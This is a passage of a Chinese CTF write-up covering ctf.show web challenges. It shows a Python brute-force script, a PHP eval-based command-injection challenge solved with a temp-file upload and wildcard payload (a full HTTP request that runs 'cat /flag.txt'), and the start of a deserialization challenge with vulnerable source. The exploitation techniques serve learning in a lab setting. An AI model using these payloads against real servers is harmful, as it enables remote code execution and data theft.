operator\">+</span>i</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        l2 <span class=\"token operator\">=</span> k<span class=\"token operator\">+</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        data<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span>l<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>                    <span class=\"token string\">'email'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>                    <span class=\"token string\">'nickname'</span><span class=\"token punctuation\">:</span><span class=\"token string\">'c'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>                    <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span>l</pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        data2<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span><span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span>l<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>                      <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span>l</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>l<span class=\"token operator\">==</span><span class=\"token string\">'flag'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            k<span class=\"token operator\">=</span><span class=\"token string\">'flag'</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        session <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>session<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        r1 <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url1<span class=\"token punctuation\">,</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        r2 <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url2<span class=\"token punctuation\">,</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        r3 <span class=\"token operator\">=</span> session<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url3<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        t <span class=\"token operator\">=</span> r3<span class=\"token punctuation\">.</span>text</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;td>\"</span><span class=\"token operator\">+</span>l<span class=\"token operator\">+</span><span class=\"token string\">\"&lt;/td>\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span>t<span class=\"token punctuation\">.</span>index<span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;td>flag@ctf.show&lt;/td>\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>            k<span class=\"token operator\">=</span>l2</pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr></table></figure><h1 id=\"红包题第二弹\"><a class=\"anchor\" href=\"#红包题第二弹\">#</a> 红包题第二弹</h1>\n<p>查看源码，获得注释 <code>?cmd</code> ，修改网址，得到代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">#error_reporting(0);</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>html</span> <span class=\"token attr-name\">lang</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>zh-CN<span class=\"token punctuation\">\"</span></span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">http-equiv</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>Content-Type<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>text/html; charset=UTF-8<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>meta</span> <span class=\"token attr-name\">name</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>viewport<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">content</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>width=device-width  minimum-scale=1.0  maximum-scale=1.0  initial-scale=1.0<span class=\"token punctuation\">\"</span></span> <span class=\"token punctuation\">/></span></span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>title</span><span class=\"token punctuation\">></span></span>ctf.show_红包题<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>title</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>head</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h2</span><span class=\"token punctuation\">></span></span>ctf.show_红包题<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h2</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>h4</span><span class=\"token punctuation\">></span></span>where is the flag?<span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>h4</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>center</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token comment\">&lt;!-- hint:?cmd= --></span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token variable\">$cmd</span><span class=\"token operator\">=</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'cmd'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/[A-Za-oq-z0-9$]+/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            </pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"cerror\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/\\~|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\（|\\）|\\-|\\_|\\&#123;|\\&#125;|\\[|\\]|\\'|\\\"|\\:|\\,/\"</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"serror\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        </pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"32\"></td><td><pre>     <span class=\"token delimiter important\">?></span></span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>body</span><span class=\"token punctuation\">></span></span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>html</span><span class=\"token punctuation\">></span></span></pre></td></tr></table></figure><p>在 php 中，使用 <code>Content-Type: multipart/form-data;</code>  上传文件时，会将它保存在临时文件中，在 php 的配置中 <code>upload_tmp_dir</code>  参数为保存临时文件的路经，linux 下面默认为 <code>/tmp</code> 。也就是说只要 php 接收上传请求，就会生成一个临时文件。如果具有上传功能，那么会将这个文件拷走储存。无论如何在执行结束后这个文件会被删除。并且 php 每次创建的临时文件名都有固定的格式，为 <code>phpXXXX.tmp</code> （Windows 中）、 <code>php**.tmp</code> （Linux 中）。</p>\n<p>思路就是上传文件生成临时文件，将真正想要执行的函数放到临时文件中，然后利用 <code>eval</code>  函数进行执行临时文件。<br />\n然后再看 cmd 这里有两个过滤，过滤了除 p 以外的所有字母数字，可用的特殊字符为 <code>. ? /</code>  等。在 linux 中， <code>source</code>  命令和 <code>.</code>  相同，用于从当前 shell 会话中读取文件和执行命令。<br />\n在 php 中，命令执行方式有：</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>system (&#39;ls&#39;)</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>echo (&#39;ls&#39;)</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>echo ls</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>&lt;?&#x3D; 等价于 &lt;?php echo</pre></td></tr></table></figure><p>因为  <code>&lt;?=</code>  没有被过滤，所以就可以用 <code>?&gt;&lt;?=</code>  来传递命令执行临时文件的内容，构造的语句为 <code>?&gt;&lt;?= .+/??p/p?p??????; ， ?&gt; </code> 为了闭合之前的 php 语句，后面为执行命令的语句， <code>+</code>  在 url 中表示空格，利用？通配符匹配到 <code>/tmp/php**.tmp</code>  文件。<br />\n最终构造的 payload 为</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>POST /?cmd=?>&lt;?=`.+/??p/p?p??????`; HTTP/1.1</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Host: 11b1397e-2020-484b-a7d3-484f22d4935b.challenge.ctf.show</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Cache-Control: max-age=0</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Upgrade-Insecure-Requests: 1</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>Accept-Encoding: gzip, deflate</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Connection: keep-alive</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>Cookie: UM_distinctid=1739f845e394-0cffbf96840b0c8-4c302d7c-144000-1739f845e3b4e2</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>Upgrade-Insecure-Requests: 1</pre></td></tr><tr><td data-num=\"12\"></td><td><pre>Cache-Control: max-age=0</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>Content-Length: 242</pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>-----------------------------10242300956292313528205888</pre></td></tr><tr><td data-num=\"16\"></td><td><pre>Content-Disposition: form-data; name=\"fileUpload\"; filename=\"1.txt\"</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>Content-Type: text/plain</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>#! /bin/bash</pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>cat /flag.txt</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>-----------------------------10242300956292313528205888--</pre></td></tr></table></figure><h1 id=\"game-gyctf-web2\"><a class=\"anchor\" href=\"#game-gyctf-web2\">#</a> game-gyctf web2</h1>\n<p>该题主要考察的时 php 反序列化和反序列化字符串逃逸</p>\n<p>首先，扫描出 <code>www.zip</code>  可以看到源码，分别为</p>\n<p>index.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">require_once</span> <span class=\"token string double-quoted-string\">\"lib.php\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'action'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__DIR__</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'action'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\".php\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script>window.location.href='./index.php?action=update'&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t\t<span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script>window.location.href='./index.php?action=login'&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>lib.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">safe</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$parm</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token variable\">$array</span><span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'union'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'regexp'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'load'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'into'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'insert'</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"'\"</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'\\\\'</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"*\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"alter\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$array</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'hacker'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$parm</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$age</span><span class=\"token operator\">=</span><span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$nickname</span><span class=\"token operator\">=</span><span class=\"token constant\">null</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">login</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'username'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'password'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token variable\">$mysqli</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">dbCtrl</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">id</span><span class=\"token operator\">=</span><span class=\"token variable\">$mysqli</span><span class=\"token operator\">-></span><span class=\"token function\">login</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'select id,password from user where username=?'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">id</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">id</span><span class=\"token punctuation\">;</span>  </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'login'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"你的ID是\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"你好！\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'token'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;script>window.location.href='./update.php'&lt;/script>\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">id</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">update</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token variable\">$Info</span><span class=\"token operator\">=</span><span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">getNewinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token variable\">$age</span><span class=\"token operator\">=</span><span class=\"token variable\">$Info</span><span class=\"token operator\">-></span><span class=\"token property\">age</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token variable\">$nickname</span><span class=\"token operator\">=</span><span class=\"token variable\">$Info</span><span class=\"token operator\">-></span><span class=\"token property\">nickname</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token variable\">$updateAction</span><span class=\"token operator\">=</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">UpdateHelper</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$Info</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"update user SET age=<span class=\"token interpolation\"><span class=\"token variable\">$age</span></span>,nickname=<span class=\"token interpolation\"><span class=\"token variable\">$nickname</span></span> where id=\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token comment\">// 这个功能还没有写完 先占坑</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getNewInfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token 